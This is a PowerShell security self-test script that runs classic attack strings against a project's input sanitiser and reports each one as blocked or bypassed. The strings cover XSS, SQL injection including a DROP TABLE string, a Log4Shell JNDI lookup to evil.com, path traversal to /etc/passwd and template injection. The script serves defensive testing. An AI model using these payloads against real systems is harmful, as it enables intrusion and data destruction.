# Vajra Daily AppSec Ritual
# Attack your own code before an attacker does

Write-Host "`n=== VAJRA APPSEC RITUAL ===" -ForegroundColor Cyan
Write-Host "Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm')`n"

$bypassed = 0
$blocked = 0

function Test-Payload {
    param($payload, $name)
    $result = uv run python -c "
from vajra.core.validation import InputSanitiser
s = InputSanitiser()
try:
    s.sanitise('$payload')
    print('BYPASSED')
except Exception:
    print('BLOCKED')
" 2>&1
    if ($result -match "BYPASSED") {
        Write-Host "  BYPASSED: $name" -ForegroundColor Red
        $script:bypassed++
    } else {
        Write-Host "  BLOCKED:  $name" -ForegroundColor Green
        $script:blocked++
    }
}

# --- XSS ---
Write-Host "[1] XSS Payloads" -ForegroundColor Yellow
Test-Payload "<script>alert(1)</script>"     "Basic XSS"
Test-Payload "<svg/onload=alert(1)>"         "SVG XSS"
Test-Payload "<img src=x onerror=alert(1)>"  "Event handler XSS"

# --- SQL Injection ---
Write-Host "`n[2] SQL Injection" -ForegroundColor Yellow
Test-Payload "' OR 1=1 --"    "Classic SQLi"
Test-Payload "'; DROP TABLE--" "Drop table SQLi"

# --- Log4Shell ---
Write-Host "`n[3] Log4Shell" -ForegroundColor Yellow
Test-Payload "`${jndi:ldap://evil.com}" "Log4Shell JNDI"

# --- Path Traversal ---
Write-Host "`n[4] Path Traversal" -ForegroundColor Yellow
Test-Payload "../../etc/passwd"     "Unix traversal"
Test-Payload "..\..\..\windows\system32" "Windows traversal"

# --- Template Injection ---
Write-Host "`n[5] Template Injection" -ForegroundColor Yellow
Test-Payload "{{7*7}}"    "Jinja2 injection"
Test-Payload "{{''.class}}" "Python template"

# --- Null Byte ---
Write-Host "`n[6] Null Byte" -ForegroundColor Yellow
Test-Payload "`0hidden"  "Null byte"

# --- Credential Leak ---
Write-Host "`n[7] Credential Leak Check" -ForegroundColor Yellow
$leak = uv run python -c "
from vajra.core.crypto import SecureCredential
c = SecureCredential.from_plaintext(b'AWS-SECRET-KEY-12345')
output = str(c) + repr(c) + f'{c}'
print('LEAKED' if 'AWS-SECRET-KEY' in output else 'SAFE')
" 2>&1
if ($leak -match "LEAKED") {
    Write-Host "  LEAKED: credential visible in logs" -ForegroundColor Red
    $script:bypassed++
} else {
    Write-Host "  SAFE: credential shows REDACTED" -ForegroundColor Green
    $script:blocked++
}

# --- CloudQuery XSS ---
Write-Host "`n[8] CloudQuery Injection Guard" -ForegroundColor Yellow
$cq = uv run python -c "
import duckdb, uuid
from pathlib import Path
db = Path('tests/.test_tmp')
db.mkdir(exist_ok=True)
db_path = db / f'{uuid.uuid4().hex}.duckdb'
conn = duckdb.connect(str(db_path))
conn.execute('CREATE TABLE gcp_storage_buckets (name VARCHAR, project_id VARCHAR, location VARCHAR, self_link VARCHAR, labels VARCHAR)')
conn.execute(\"INSERT INTO gcp_storage_buckets VALUES ('<script>alert(1)</script>','p','us','link','{}')\")
conn.close()
from vajra.data.cloudquery_adapter import CloudQueryAdapter
a = CloudQueryAdapter(db_path)
assets = a.load_assets()
print('BYPASSED' if '<script>' in assets[0].name else 'BLOCKED')
" 2>&1
if ($cq -match "BYPASSED") {
    Write-Host "  BYPASSED: XSS in cloud resource name not sanitised" -ForegroundColor Red
    $script:bypassed++
} else {
    Write-Host "  BLOCKED:  XSS in cloud resource name sanitised" -ForegroundColor Green
    $script:blocked++
}

# --- SUMMARY ---
Write-Host "`n=== APPSEC SUMMARY ===" -ForegroundColor Cyan
Write-Host "Blocked:  $blocked" -ForegroundColor Green
Write-Host "Bypassed: $bypassed" -ForegroundColor Red
if ($bypassed -eq 0) {
    Write-Host "ALL ATTACKS BLOCKED — defenses holding" -ForegroundColor Green
} else {
    Write-Host "$bypassed attack(s) bypassed — fix before committing" -ForegroundColor Red
}
